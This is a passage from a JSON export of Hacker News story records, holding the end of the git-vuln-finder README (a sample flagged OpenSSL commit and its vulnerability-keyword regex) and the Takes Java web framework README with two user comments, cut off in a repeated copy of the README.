\"https://api.github.com/repos/curl/curl/commits/c2b3f264cb5210f82bdc84a3b89250a611b68dd3\", \"tags\": [], \"state\": \"under-review\" }, ... Extracting CVE id(s) from git messages \"98d132cf6a879faf0147aa83ea0c07ff326260ed\": { \"message\": \"Add a macro for testing assertion in both debug and production builds\\n\\nIf we have an assert then in a debug build we want an abort() to occur.\\nIn a production build we wan t the function to return an error.\\n\\nThis introduces a new macro to assist with that. The idea is to replace\\nexisting use of OPENSSL_assert() with this new macro. The problem with\\nOPENSSL _assert() is that it aborts() on an assertion failure in both debug\\nand production builds. It should never be a library's decision to abort a\\nprocess (we don't get to decide when to kill t he life support machine or\\nthe nuclear reactor control system). Additionally if an attacker can\\ncause a reachable assert to be hit then this can be a source of DoS attacks\\ne.g. see CVE-20 17-3733, CVE-2015-0293, CVE-2011-4577 and CVE-2002-1568.\\n\\nReviewed-by: Tim Hudson <tjh@openssl.org>\\n(Merged from https://github.com/openssl/openssl/pull/3496)\", \"commit-id\": \"98d132cf6a879faf0147aa83ea0c07ff326260ed\", \"summary\": \"Add a macro for testing assertion in both debug and production builds\", \"stats\": { \"insertions\": 18, \"deletions\": 0, \"lines\": 18, \"files\": 1 }, \"author\": \"Matt Caswell\", \"author-email\": \"matt@openssl.org\", \"authored_date\": 1495182637, \"committed_date\": 1495457671, \"branches\": [ \"master\" ], \"pattern-selected\": \"(?i)(denial of service |\\bXXE\\b|remote code execution|\\bopen redirect|OSVDB|\\bvuln|\\bCVE\\b |\\bXSS\\b|\\bReDoS\\b|\\bNVD\\b|malicious|xframeoptions|attack|cross site |ex ploit|malicious|directory traversal |\\bRCE\\b|\\bdos\\b|\\bXSRF \\b|\\bXSS\\b|clickjack|session.fixation|hijack|\\badvisory|\\binsecure |security |\\bcrossorigin\\b|unauthori[z|s]ed |infinite loop)\", \"pattern-matches\": [ \"attack\" ], \"cve\": [ \"CVE-2017-3733\", \"CVE-2015-0293\", \"CVE-2011-4577\", \"CVE-2002-1568\" ], \"state\": \"cve-assigned\" } Running the tests License and author(s) This software is free software and licensed under the AGPL version 3. Copyright (c) 2019-2020 Alexandre Dulaunoy - https://github.com/adulau/ Acknowledgment Thanks to Jean-Louis Huynen for the discussions about the crypto vulnerability patterns. Thanks to Sebastien Tricaud for the discussions regarding native language, commit messages and external patterns. Thanks to Cedric Bonhomme to make git-vuln-finder a Python library, add tests and improve the overall installation process. Contributing We welcome contributions for the software and especially additional vulnerability patterns. Every contributors will be added in the AUTHORS file and collectively own this open source software. The contributors acknowledge the Developer Certificate of Origin. References Notes https://csce.ucmss.com/cr/books/2017/LFS/CSREA2017/ICA2077.pdf (mainly using CVE referenced in the commit message) - archive (http://archive.is/xep9o) https://asankhaya.github.io/pdf/automated-identification-of-security-issues-from-commit-messages-and-bug-reports.pdf (2 main regexps) ",
        "_version_": 1718527433987063808
      },
      {
        "story_id": [20267561],
        "story_author": ["yegor256a"],
        "story_descendants": [34],
        "story_score": [40],
        "story_time": ["2019-06-24T19:36:22Z"],
        "story_title": "Takes: Java web framework without static methods or annotations",
        "search": [
          "Takes: Java web framework without static methods or annotations",
          "https://github.com/yegor256/takes",
          "Project architect: @paulodamaso Takes is a true object-oriented and immutable Java8 web development framework. Its key benefits, comparing to all others, include these four fundamental principles: Not a single null (why NULL is bad?) Not a single public static method (why they are bad?) Not a single mutable class (why they are bad?) Not a single instanceof keyword, type casting, or reflection (why?) Of course, there are no configuration files. Besides that, these are more traditional features, out of the box: Hit-refresh debugging XML+XSLT JSON RESTful Templates, incl. Apache Velocity This is what is not supported and won't be supported: WebSockets These two web systems use Takes, and they are open source: wring.io (sources), jare.io (sources). Watch these videos to learn more: An Immutable Object-Oriented Web Framework and Takes, Java Web Framework, Intro. This blog post may help you too. Contents Quick Start Build and Run With Maven Build and Run With Gradle Unit Testing Integration Testing A Bigger Example Front Interface Back Interface Templates Velocity Templates Static Resources Hit Refresh Debugging Request Methods (POST, PUT, HEAD, etc.) Request Parsing Form Processing Exception Handling Redirects RsJSON RsXembly GZIP Compression SSL Configuration Authentication Command Line Arguments Logging Directory Layout Optional dependencies Backward compatibility Version pattern for RESTful API How to contribute Got questions? Quick Start Create this App.java file: import org.takes.http.Exit; import org.takes.http.FtBasic; import org.takes.facets.fork.FkRegex; import org.takes.facets.fork.TkFork; public final class App { public static void main(final String... args) throws Exception { new FtBasic( new TkFork(new FkRegex(\"/\", \"hello, world!\")), 8080 ).start(Exit.NEVER); } } Then, download takes.jar and compile your Java code: $ javac -cp takes.jar App.java Now, run it like this: $ java -Dfile.encoding=UTF-8 -cp takes.jar:. App Should work :) This code starts a new HTTP server on port 8080 and renders a plain-text page on all requests at the root URI. Important: Pay attention that UTF-8 encoding is set on the command line. The entire framework relies on your default Java encoding, which is not necessarily UTF-8 by default. To be sure, always set it on the command line with file.encoding Java argument. We decided not to hard-code \"UTF-8\" in our code mostly because this would be against the entire idea of Java localization, according to which a user always should have a choice of encoding and language selection. We're using Charset.defaultCharset() everywhere in the code. Build and Run With Maven If you're using Maven, this is how your pom.xml should look like: <project> <dependencies> <dependency> <groupId>org.takes</groupId> <artifactId>takes</artifactId> </dependency> </dependencies> <profiles> <profile> <id>hit-refresh</id> <build> <plugins> <plugin> <groupId>org.codehaus.mojo</groupId> <artifactId>exec-maven-plugin</artifactId> <version>1.3</version> <executions> <execution> <id>start-server</id> <phase>pre-integration-test</phase> <goals> <goal>java</goal> </goals> </execution> </executions> <configuration> <mainClass>foo.App</mainClass> <!-- your main class --> <cleanupDaemonThreads>false</cleanupDaemonThreads> <arguments> <argument>--port=${port}</argument> </arguments> </configuration> </plugin> </plugins> </build> </profile> </profiles> </project> With this configuration you can run it from command line: $ mvn clean integration-test -Phit-refresh -Dport=8080 Maven will start the server and you can see it at http://localhost:8080. Using in servlet app Create a take with constructor accepting ServletContext: package com.myapp; public final class TkApp implements Take { private final ServletContext ctx; public TkApp(final ServletContext context) { this.ctx = context; } @Override public Response act(final Request req) throws Exception { return new RsText(\"Hello servlet!\"); } } Add org.takes.servlet.SrvTake to your web.xml, don't forget to specify take class as servlet init-param: <servlet> <servlet-name>takes</servlet-name> <servlet-class>org.takes.servlet.SrvTake</servlet-class> <init-param> <param-name>take</param-name> <param-value>com.myapp.TkApp</param-value> </init-param> </servlet> <servlet-mapping> <servlet-name>takes</servlet-name> <url-pattern>/*</url-pattern> </servlet-mapping> Build and Run With Gradle If you're using Gradle, this is how your build.gradle should look like: plugins { id 'java' id 'application' } repositories { mavenCentral() } dependencies { compile group: 'org.takes', name: 'takes', version: '1.11.3' } mainClassName='foo.App' //your main class With this configuration you can run it from command line: $ gradle run -Phit-refresh -Dport=8080 Unit Testing This is how you can unit test the app, using JUnit 4.x and Hamcrest: public final class AppTest { @Test public void returnsHttpResponse() throws Exception { MatcherAssert.assertThat( new RsPrint( new App().act(new RqFake(\"GET\", \"/\")) ).printBody(), Matchers.equalsTo(\"hello, world!\") ); } } You can create a fake request with form parameters like this: new RqForm.Fake( new RqFake(), \"foo\", \"value-1\", \"bar\", \"value-2\" ) Integration Testing Here is how you can test the entire server via HTTP, using JUnit and jcabi-http for making HTTP requests: public final class AppITCase { @Test public void returnsTextPageOnHttpRequest() throws Exception { new FtRemote(new App()).exec( new FtRemote.Script() { @Override public void exec(final URI home) throws IOException { new JdkRequest(home) .fetch() .as(RestResponse.class) .assertStatus(HttpURLConnection.HTTP_OK) .assertBody(Matchers.equalTo(\"hello, world!\")); } } ); } } More complex integration testing examples you can find in one of the open source projects that are using Take, for example: rultor.com. A Bigger Example Let's make it a bit more sophisticated: public final class App { public static void main(final String... args) { new FtBasic( new TkFork( new FkRegex(\"/robots\\\\.txt\", \"\"), new FkRegex(\"/\", new TkIndex()) ), 8080 ).start(Exit.NEVER); } } The FtBasic is accepting new incoming sockets on port 8080, parses them according to HTTP 1.1 specification and creates instances of class Request. Then, it gives requests to the instance of TkFork (tk stands for \"take\") and expects it to return an instance of Take back. As you probably understood already, the first regular expression that matches returns a take. TkIndex is our custom class, let's see how it looks: public final class TkIndex implements Take { @Override public Response act(final Request req) { return new RsHtml(\"<html>Hello, world!</html>\"); } } It is immutable and must implement a single method act(), which is returning an instance of Response. So far so good, but this class doesn't have an access to an HTTP request. Here is how we solve this: new TkFork( new FkRegex( \"/file/(?<path>[^/]+)\", new TkRegex() { @Override public Response act(final RqRegex request) throws Exception { final File file = new File( request.matcher().group(\"path\") ); return new RsHTML( FileUtils.readFileToString(file, Charsets.UTF_8) ); } } ) ) We're using TkRegex instead of Take, in order to deal with RqRegex instead of a more generic Request. RqRegex gives an instance of Matcher used by FkRegex for pattern matching. Here is a more complex and verbose example: public final class App { public static void main(final String... args) { new FtBasic( new TkFork( new FkRegex(\"/robots.txt\", \"\"), new FkRegex(\"/\", new TkIndex()), new FkRegex( \"/xsl/.*\", new TkWithType(new TkClasspath(), \"text/xsl\") ), new FkRegex(\"/account\", new TkAccount(users)), new FkRegex(\"/balance/(?<user>[a-z]+)\", new TkBalance()) ) ).start(Exit.NEVER); } } Front interface Essential part of Bigger Example is Front interface. It's encapsulates server's back-end and used to start an instance, which will accept requests and return results. FtBasic, which is a basic front, implements that interface - you've seen it's usage in above mentioned example. There are other useful implementations of this interface: The FtRemote class allows you to provide script, that will be executed against given front. You can see how it's used in integration tests. The FtCli class allows you to start your application with command line arguments. More details in Command Line Arguments. The FtSecure class allows you to start your application with SSL. More details in SSL Configuration. Back interface Back interface is the back-end that is responsible for IO operations on TCP network level. There are various useful implementations of that interface: The BkBasic class is a basic implementation of the Back interface. It is responsible for accepting the request from Socket, converting the socket's input to the Request, dispatching it to the provided Take instance, getting the result and printing it to the socket's output until all the request is fulfilled. The BkParallel class is a decorator of the Back interface, that is responsible for running the back-end in parallel threads. You can specify the number of threads or try to use the default number, which depends on available processors number in JVM. The BkSafe class is a decorator of the Back interface, that is responsible for running the back-end in a safe mode. That means that it will ignore exception thrown from original Back. The BkTimeable class is a decorator of the Back interface, that is responsible for running the back-end for specified maximum lifetime in milliseconds. It is constantly checking if the thread with original back exceeds provided limit and if so - it's interrupts the thread of that back. The BkWrap class is a convenient wrap over the original Back instance. It's just delegates the accept to that Back and might be useful if you want to add your own decorators of the Back interface. This class is used in BkParallel and BkSafe as a parent class. Templates Now let's see how we can render something more complex than an plain text. First, XML+XSLT is a recommended mechanism of HTML rendering. Even though it may be too complex, give it a try, you won't regret. Here is how we render a simple XML page that is transformed to HTML5 on-fly (more about RsXembly read below): public final class TkAccount implements Take { private final Users users; public TkAccount(final Users users) { this.users = users; } @Override public Response act(final Request req) { final User user = this.users.find(new RqCookies(req).get(\"user\")); return new RsLogin( new RsXSLT( new RsXembly( new XeStylesheet(\"/xsl/account.xsl\"), new XeAppend(\"page\", user) ) ), user ); } } This is how that User class may look like: public final class User implements XeSource { private final String name; private final int balance; @Override public Iterable<Directive> toXembly() { return new Directives().add(\"user\") .add(\"name\").set(this.name).up() .add(\"balance\").set(Integer.toString(this.balance)); } } Here is how RsLogin may look like: public final class RsLogin extends RsWrap { public RsLogin(final Response response, final User user) { super( new RsWithCookie( response, \"user\", user.toString() ) ); } } Velocity Templates Let's say, you want to use Velocity: public final class TkHelloWorld implements Take { @Override public Response act(final Request req) { return new RsVelocity( \"hi, ${user.name}! You've got ${user.balance}\", new RsVelocity.Pair(\"user\", new User()) ); } } You will need this extra dependency in classpath: <dependency> <groupId>org.apache.velocity</groupId> <artifactId>velocity-engine-core</artifactId> <scope>runtime</scope> </dependency> For Gradle users: dependencies { ... runtime group: 'org.apache.velocity', name: 'velocity-engine-core', version: 'x.xx'//put the version here ... } Static Resources Very often you need to serve static resources to your web users, like CSS stylesheets, images, JavaScript files, etc. There are a few supplementary classes for that: new TkFork( new FkRegex(\"/css/.+\", new TkWithType(new TkClasspath(), \"text/css\")), new FkRegex(\"/data/.+\", new TkFiles(new File(\"/usr/local/data\")) ) Class TkClasspath take static part of the request URI and finds a resource with this name in classpath. TkFiles just looks by file name in the directory configured. TkWithType sets content type of all responses coming out of the decorated take. Hit Refresh Debugging It is a very convenient feature. Once you start the app you want to be able to modify its static resources (CSS, JS, XSL, etc), refresh the page in a browser and immediately see the result. You don't want to re-compile the entire project and restart it. Here is what you need to do to your sources in order to enable that feature: new TkFork( new FkRegex( \"/css/.+\", new TkWithType( new TkFork( new FkHitRefresh( \"./src/main/resources/foo/scss/**\", // what sources to watch \"mvn sass:compile\", // what to run when sources are modified new TkFiles(\"./target/css\") ) new FkFixed(new TkClasspath()) ), \"text/css\" ) ) ) This FkHitRefresh fork is a decorator of take. Once it sees X-Take-Refresh header in the request, it realizes that the server is running in \"hit-refresh\" mode and passes the request to the encapsulated take. Before it passes the request it tries to understand whether any of the resources are older than compiled files. If they are older, it tries to run compilation tool to build them again. Request Methods (POST, PUT, HEAD, etc.) Here is an example: new TkFork( new FkRegex( \"/user\", new TkFork( new FkMethods(\"GET\", new TkGetUser()), new FkMethods(\"POST,PUT\", new TkPostUser()), new FkMethods(\"DELETE\", new TkDeleteUser()) ) ) ) Request Parsing Here is how you can parse an instance of Request: Href href = new RqHref.Base(request).href(); URI uri = href.uri(); Iterable<String> values = href.param(\"key\"); For a more complex parsing try to use Apache Http Client or something similar. Form Processing Here is an example: public final class TkSavePhoto implements Take { @Override public Response act(final Request req) { final String name = new RqForm(req).param(\"name\"); return new RsWithStatus(HttpURLConnection.HTTP_NO_CONTENT); } } Exception Handling By default, TkFork lets all exceptions bubble up. If one of your take crashes, a user will see a default error page. Here is how you can configure this behavior: public final class App { public static void main(final String... args) { new FtBasic( new TkFallback( new TkFork( new FkRegex(\"/robots\\\\.txt\", \"\"), new FkRegex(\"/\", new TkIndex()) ), new FbChain( new FbStatus(404, new RsText(\"sorry, page is absent\")), new FbStatus(405, new RsText(\"this method is not allowed here\")), new Fallback() { @Override public Iterator<Response> route(final RqFallback req) { return Collections.<Response>singleton( new RsHTML(\"oops, something went terribly wrong!\") ).iterator(); } } ) ), 8080 ).start(Exit.NEVER); } } TkFallback decorates an instance of Take and catches all exceptions any of its take may throw. Once it's thrown, an instance of FbChain will find the most suitable fallback and will fetch a response from there. Redirects Sometimes it's very useful to return a redirect response (30x status code), either by a normal return or by throwing an exception. This example illustrates both methods: public final class TkPostMessage implements Take { @Override public Response act(final Request req) { final String body = new RqPrint(req).printBody(); if (body.isEmpty()) { throw new RsForward( new RsFlash(\"message can't be empty\") ); } // save the message to the database return new RsForward( new RsFlash( \"thanks, the message was posted\" ), \"/\" ); } } Then, you should decorate the entire TkFork with this TkForward and TkFlash: public final class App { public static void main(final String... args) { new FtBasic( new TkFlash( new TkForward( new TkFork(new FkRegex(\"/\", new TkPostMessage()) ) ), 8080 ).start(Exit.NEVER); } } RsJSON Here is how we can deal with JSON: public final class TkBalance extends TkFixed { @Override public Response act(final RqRegex request) { return new RsJSON( new User(request.matcher().group(\"user\"))) ); } } This is the method to add to User: public final class User implements XeSource, RsJSON.Source { @Override public JsonObject toJSON() { return Json.createObjectBuilder() .add(\"balance\", this.balance) .build(); } } RsXembly Here is how you generate an XML page using Xembly: Response response = new RsXembly( new XeAppend(\"page\"), new XeDirectives(\"XPATH '/page'\", this.user) ) This is a complete example, with all possible options: Response response = new RsXembly( new XeStylesheet(\"/xsl/account.xsl\"), // add processing instruction new XeAppend( \"page\", // create a DOM document with \"page\" root element new XeMillis(false), // add \"millis\" attribute to the root, with current time user, // add user to the root element new XeSource() { @Override public Iterable<Directive> toXembly() { return new Directives().add(\"status\").set(\"alive\"); } }, new XeMillis(true), // replace \"millis\" attribute with take building time ), ) This is the output that will be produced: <?xml version='1.0'?> <?xsl-stylesheet href='/xsl/account.xsl'?> <page> <millis>5648</millis> <user> <name>Jeff Lebowski</name> <balance>123</balance> </user> <status>alive</status> </page> To avoid duplication of all this scaffolding in every page, you can create your own class, which will be used in every page, for example: Response response = new RsXembly( new XeFoo(user) ) This is how this XeFoo class would look like: public final class XeFoo extends XeWrap { public XeFoo(final String stylesheet, final XeSource... sources) { super( new XeAppend( \"page\", new XeMillis(false), new XeStylesheet(stylesheet), new XeChain(sources), new XeSource() { @Override public Iterable<Directive> toXembly() { return new Directives().add(\"status\").set(\"alive\"); } }, new XeMillis(true) ) ); } } You will need this extra dependency in classpath: <dependency> <groupId>com.jcabi.incubator</groupId> <artifactId>xembly</artifactId> </dependency> More about this mechanism in this blog post: XML Data and XSL Views in Takes Framework. Cookies Here is how we drop a cookie to the user: public final class TkIndex implements Take { @Override public Response act(final Request req) { return new RsWithCookie(\"auth\", \"John Doe\"); } } An HTTP response will contain this header, which will place a auth cookie into the user's browser: HTTP/1.1 200 OK Set-Cookie: auth=\"John Doe\" This is how you read cookies from a request: public final class TkIndex implements Take { @Override public Response act(final Request req) { // the list may be empty final Iterable<String> cookies = new RqCookies(req).cookie(\"my-cookie\"); } } GZIP Compression If you want to compress all your responses with GZIP, wrap your take in TkGzip: Now, each request that contains Accept-Encoding request header with gzip compression method inside will receive a GZIP-compressed response. Also, you can compress an individual response, using RsGzip decorator. Content Negotiation Say, you want to return different content based on Accept header of the request (a.k.a. content negotation): public final class TkIndex implements Take { @Override public Response act(final Request req) { return new RsFork( req, new FkTypes(\"text/*\", new RsText(\"it's a text\")) new FkTypes(\"application/json\", new RsJSON(\"{\\\"a\\\":1}\")) new FkTypes(\"image/png\", /* something else */) ); } } SSL Configuration First of all, setup your keystore settings, for example final String file = this.getClass().getResource(\"/org/takes/http/keystore\").getFile(); final String password = \"abc123\"; System.setProperty(\"javax.net.ssl.keyStore\", file); System.setProperty(\"javax.net.ssl.keyStorePassword\", password); System.setProperty(\"javax.net.ssl.trustStore\", file); System.setProperty(\"javax.net.ssl.trustStorePassword\", password); Then simple create exemplar of class FtSecure with socket factory final ServerSocket skt = SSLServerSocketFactory.getDefault().createServerSocket(0); new FtRemote( new FtSecure(new BkBasic(new TkFixed(\"hello, world\")), skt), skt, true ); Authentication Here is an example of login via Facebook: new TkAuth( new TkFork( new FkRegex(\"/\", new TkHTML(\"hello, check <a href='/acc'>account</a>\")), new FkRegex(\"/acc\", new TkSecure(new TkAccount())) ), new PsChain( new PsCookie( new CcSafe(new CcHex(new CcXOR(new CcCompact(), \"secret-code\"))) ), new PsByFlag( new PsByFlag.Pair( PsFacebook.class.getSimpleName(), new PsFacebook(\"facebook-app-id\", \"facebook-secret\") ), new PsByFlag.Pair( PsLogout.class.getSimpleName(), new PsLogout() ) ) ) ) Then, you need to show a login link to the user, which he or she can click and get to the Facebook OAuth authentication page. Here is how you do this with XeResponse: new RsXembly( new XeStylesheet(\"/xsl/index.xsl\"), new XeAppend( \"page\", new XeFacebookLink(req, \"facebook-app-id\"), // ... other xembly sources ) ) The link will be add to the XML page like this: <page> <links> <link rel=\"take:facebook\" href=\"https://www.facebook.com/dialog/oauth...\"/> </links> </page> Similar mechanism can be used for PsGithub, PsGoogle, PsLinkedin, PsTwitter, etc. This is how you get currently logged in user: public final class TkAccount implements Take { @Override public Response act(final Request req) { final Identity identity = new RqAuth(req).identity(); if (this.identity.equals(Identity.ANONYMOUS)) { // returns \"urn:facebook:1234567\" for a user logged in via Facebook this.identity().urn(); } } } More about it in this blog post: How Cookie-Based Authentication Works in the Takes Framework Command Line Arguments There is a convenient class FtCLI that parses command line arguments and starts the necessary Front accordingly. There are a few command line arguments that should be passed to FtCLI constructor: --port=1234 Tells the server to listen to TCP port 1234 --lifetime=5000 The server will die in five seconds (useful for integration testing) --hit-refresh Run the server in hit-refresh mode --daemon Runs the server in Java daemon thread (for integration testing) --threads=30 Processes incoming HTTP requests in 30 parallel threads --max-latency=5000 Maximum latency in milliseconds per each request (longer requests will be interrupted) For example: public final class App { public static void main(final String... args) { new FtCLI( new TkFork(new FkRegex(\"/\", \"hello, world!\")), args ).start(Exit.NEVER); } } Then, run it like this: $ java -cp take.jar App.class --port=8080 --hit-refresh You should see \"hello, world!\" at http://localhost:8080. Parameter --port also accepts file name, instead of a number. If the file exists, FtCLI will try to read its content and use it as port number. If the file is absent, FtCLI will allocate a new random port number, use it to start a server, and save it to the file. Logging The framework sends all logs to SLF4J logging facility. If you want to see them, configure one of SLF4J bindings. To make a Take log, wrap it in a TkSlf4j - for example: new TkSlf4j( new TkFork(...) ) Directory Layout You are free to use any build tool, but we recommend Maven. This is how your project directory layout may/should look like: /src /main /java /foo App.java /scss /coffeescript /resources /vtl /xsl /js /css robot.txt log4j.properties /test /java /foo AppTest.java /resources log4j.properties pom.xml LICENSE.txt Optional dependencies If you're using Maven and include Takes as a dependency in your own project, you can choose which of the optional dependencies to include in your project. The list of all of the optional dependencies can be seen in the Takes project pom.xml. For example, to use the Facebook API shown above, simply add a dependency to the restfb API in your project: <dependency> <groupId>com.restfb</groupId> <artifactId>restfb</artifactId> <version>1.15.0</version> <scope>runtime</scope> </dependency> For Gradle, you should add the dependencies as usual: dependencies { ... runtime group: 'com.restfb', name: 'restfb', version: '1.15.0' } Backward compatibility Version 2.0 is not backward compatible with previous versions. Version pattern for RESTful API The URL should NOT contain the versions, but the type requested. For example: ===> GET /architect/256 HTTP/1.1 Accept: application/org.takes.architect-v1+xml <=== HTTP/1.1 200 OK Content-Type: application/org.takes.architect-v1+xml <architect> <name>Yegor Bugayenko</name> </architect> Then clients aware of newer version of this service can call: ===> GET /architect/256 HTTP/1.1 Accept: application/org.takes.architect-v2+xml <=== HTTP/1.1 200 OK Content-Type: application/org.takes.architect-v2+xml <architect> <firstName>Yegor</firstName> <lastName>Bugayenko</lastName> <salutation>Mr.</salutation> </architect> This article explains why its done this way. How to contribute Fork repository, make changes, send us a pull request. We will review your changes and apply them to the master branch shortly, provided they don't violate our quality standards. To avoid frustration, before sending us your pull request please run full Maven build: $ mvn clean install -Pqulice To avoid build errors use maven 3.2+. Pay attention that our pom.xml inherits a lot of configuration from jcabi-parent. This article explains why it's done this way. Got questions? If you have questions or general suggestions, don't hesitate to submit a new Github issue. ",
          "I was reading through one of the linked articles of why the author doesn't like using null or static objects:<p><a href=\"https://www.yegor256.com/2014/05/13/why-null-is-bad.html\" rel=\"nofollow\">https://www.yegor256.com/2014/05/13/why-null-is-bad.html</a><p><a href=\"https://www.yegor256.com/2014/05/05/oop-alternative-to-utility-classes.html\" rel=\"nofollow\">https://www.yegor256.com/2014/05/05/oop-alternative-to-utili...</a><p>Apparently he replaces null with null objects or throwing exceptions, and creates objects for every static method. Go figure.<p>Actually, there are a few gems:<p>> The Map interface (no offense to its authors) has a design flaw.<p>> It is a good practice to make your code as fragile as possible, letting it break when necessary.<p>> The method is basically asking the object about its… race. Black objects go right while white objects go left. That’s what this instanceof is doing, and that’s what discrimination is all about.",
          "I don't understand why the names are so bad. FtFoo, TkBar, XyBaz. Not pronounceable, meaning not inferable. I like Yegor's stuff mostly, but the naming just kills me."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/yegor256/takes",
        "comments.comment_id": [20267911, 20267943],
        "comments.comment_author": ["saagarjha", "fwilhe"],
        "comments.comment_descendants": [1, 2],
        "comments.comment_time": [
          "2019-06-24T20:10:57Z",
          "2019-06-24T20:14:01Z"
        ],
        "comments.comment_text": [
          "I was reading through one of the linked articles of why the author doesn't like using null or static objects:<p><a href=\"https://www.yegor256.com/2014/05/13/why-null-is-bad.html\" rel=\"nofollow\">https://www.yegor256.com/2014/05/13/why-null-is-bad.html</a><p><a href=\"https://www.yegor256.com/2014/05/05/oop-alternative-to-utility-classes.html\" rel=\"nofollow\">https://www.yegor256.com/2014/05/05/oop-alternative-to-utili...</a><p>Apparently he replaces null with null objects or throwing exceptions, and creates objects for every static method. Go figure.<p>Actually, there are a few gems:<p>> The Map interface (no offense to its authors) has a design flaw.<p>> It is a good practice to make your code as fragile as possible, letting it break when necessary.<p>> The method is basically asking the object about its… race. Black objects go right while white objects go left. That’s what this instanceof is doing, and that’s what discrimination is all about.",
          "I don't understand why the names are so bad. FtFoo, TkBar, XyBaz. Not pronounceable, meaning not inferable. I like Yegor's stuff mostly, but the naming just kills me."
        ],
        "id": "364ac87c-b603-47e0-bb62-4c356e4aa3d3",
        "url_text": "Project architect: @paulodamaso Takes is a true object-oriented and immutable Java8 web development framework. Its key benefits, comparing to all others, include these four fundamental principles: Not a single null (why NULL is bad?) Not a single public static method (why they are bad?) Not a single mutable class (why they are bad?) Not a single instanceof keyword, type casting, or reflection (why?) Of course, there are no configuration files. Besides that, these are more traditional features, out of the box: Hit-refresh debugging XML+XSLT JSON RESTful Templates, incl. Apache Velocity This is what is not supported and won't be supported: WebSockets These two web systems use Takes, and they are open source: wring.io (sources), jare.io (sources). Watch these videos to learn more: An Immutable Object-Oriented Web Framework and Takes, Java Web Framework, Intro. This blog post may help you too. Contents Quick Start Build and Run With Maven Build and Run With Gradle Unit Testing Integration Testing A Bigger Example Front Interface Back Interface Templates Velocity Templates Static Resources Hit Refresh Debugging Request Methods (POST, PUT, HEAD, etc.) Request Parsing Form Processing Exception Handling Redirects RsJSON RsXembly GZIP Compression SSL Configuration Authentication Command Line Arguments Logging Directory Layout Optional dependencies Backward compatibility Version pattern for RESTful API How to contribute Got questions? Quick Start Create this App.java file: import org.takes.http.Exit; import org.takes.http.FtBasic; import org.takes.facets.fork.FkRegex; import org.takes.facets.fork.TkFork; public final class App { public static void main(final String... args) throws Exception { new FtBasic( new TkFork(new FkRegex(\"/\", \"hello, world!\")), 8080 ).start(Exit.NEVER); } } Then, download takes.jar and compile your Java code: $ javac -cp takes.jar App.java Now, run it like this: $ java -Dfile.encoding=UTF-8 -cp takes.jar:. App Should work :) This code starts a new HTTP server on port 8080 and renders a plain-text page on all requests at the root URI. Important: Pay attention that UTF-8 encoding is set on the command line. The entire framework relies on your default Java encoding, which is not necessarily UTF-8 by default. To be sure, always set it on the command line with file.encoding Java argument. We decided not to hard-code \"UTF-8\" in our code mostly because this would be against the entire idea of Java localization, according to which a user always should have a choice of encoding and language selection. We're using Charset.defaultCharset() everywhere in the code. Build and Run With Maven If you're using Maven, this is how your pom.xml should look like: <project> <dependencies> <dependency> <groupId>org.takes</groupId> <artifactId>takes</artifactId> </dependency> </dependencies> <profiles> <profile> <id>hit-refresh</id> <build> <plugins> <plugin> <groupId>org.codehaus.mojo</groupId> <artifactId>exec-maven-plugin</artifactId> <version>1.3</version> <executions> <execution> <id>start-server</id> <phase>pre-integration-test</phase> <goals> <goal>java</goal> </goals> </execution> </executions> <configuration> <mainClass>foo.App</mainClass> <!-- your main class --> <cleanupDaemonThreads>false</cleanupDaemonThreads> <arguments> <argument>--port=${port}</argument> </arguments> </configuration> </plugin> </plugins> </build> </profile> </profiles> </project> With this configuration you can run it from command line: $ mvn clean integration-test -Phit-refresh -Dport=8080 Maven will start the server and you can see it at http://localhost:8080. Using in servlet app Create a take with constructor accepting ServletContext: package com.myapp; public final class TkApp implements Take { private final ServletContext ctx; public TkApp(final ServletContext context) { this.ctx = context; } @Override public Response act(final Request req) throws Exception { return new RsText(\"Hello servlet!\"); } } Add org.takes.servlet.SrvTake to your web.xml, don't forget to specify take class as servlet init-param: <servlet> <servlet-name>takes</servlet-name> <servlet-class>org.takes.servlet.SrvTake</servlet-class> <init-param> <param-name>take</param-name> <param-value>com.myapp.TkApp</param-value> </init-param> </servlet> <servlet-mapping> <servlet-name>takes</servlet-name> <url-pattern>/*</url-pattern> </servlet-mapping> Build and Run With Gradle If you're using Gradle, this is how your build.gradle should look like: plugins { id 'java' id 'application' } repositories { mavenCentral() } dependencies { compile group: 'org.takes', name: 'takes', version: '1.11.3' } mainClassName='foo.App' //your main class With this configuration you can run it from command line: $ gradle run -Phit-refresh -Dport=8080 Unit Testing This is how you can unit test the app, using JUnit 4.x and Hamcrest: public final class AppTest { @Test public void returnsHttpResponse() throws Exception { MatcherAssert.assertThat( new RsPrint( new App().act(new RqFake(\"GET\", \"/\")) ).printBody(), Matchers.equalsTo(\"hello, world!\") ); } } You can create a fake request with form parameters like this: new RqForm.Fake( new RqFake(), \"foo\", \"value-1\", \"bar\", \"value-2\" ) Integration Testing Here is how you can test the entire server via HTTP, using JUnit and jcabi-http for making HTTP requests: public final class AppITCase { @Test public void returnsTextPageOnHttpRequest() throws Exception { new FtRemote(new App()).exec( new FtRemote.Script() { @Override public void exec(final URI home) throws IOException { new JdkRequest(home) .fetch() .as(RestResponse.class) .assertStatus(HttpURLConnection.HTTP_OK) .assertBody(Matchers.equalTo(\"hello, world!\")); } } ); } } More complex integration testing examples you can find in one of the open source projects that are using Take, for example: rultor.com. A Bigger Example Let's make it a bit more sophisticated: public final class App { public static void main(final String... args) { new FtBasic( new TkFork( new FkRegex(\"/robots\\\\.txt\", \"\"), new FkRegex(\"/\", new TkIndex()) ), 8080 ).start(Exit.NEVER); } } The FtBasic is accepting new incoming sockets on port 8080, parses them according to HTTP 1.1 specification and creates instances of class Request. Then, it gives requests to the instance of TkFork (tk stands for \"take\") and expects it to return an instance of Take back. As you probably understood already, the first regular expression that matches returns a take. TkIndex is our custom class, let's see how it looks: public final class TkIndex implements Take { @Override public Response act(final Request req) { return new RsHtml(\"<html>Hello, world!</html>\"); } } It is immutable and must implement a single method act(), which is returning an instance of Response. So far so good, but this class doesn't have an access to an HTTP request. Here is how we solve this: new TkFork( new FkRegex( \"/file/(?<path>[^/]+)\", new TkRegex() { @Override public Response act(final RqRegex request) throws Exception { final File file = new File( request.matcher().group(\"path\") ); return new RsHTML( FileUtils.readFileToString(file, Charsets.UTF_8) ); } } ) ) We're using TkRegex instead of Take, in order to deal with RqRegex instead of a more generic Request. RqRegex gives an instance of Matcher used by FkRegex for pattern matching. Here is a more complex and verbose example: public final class App { public static void main(final String... args) { new FtBasic( new TkFork( new FkRegex(\"/robots.txt\", \"\"), new FkRegex(\"/\", new TkIndex()), new FkRegex( \"/xsl/.*\", new 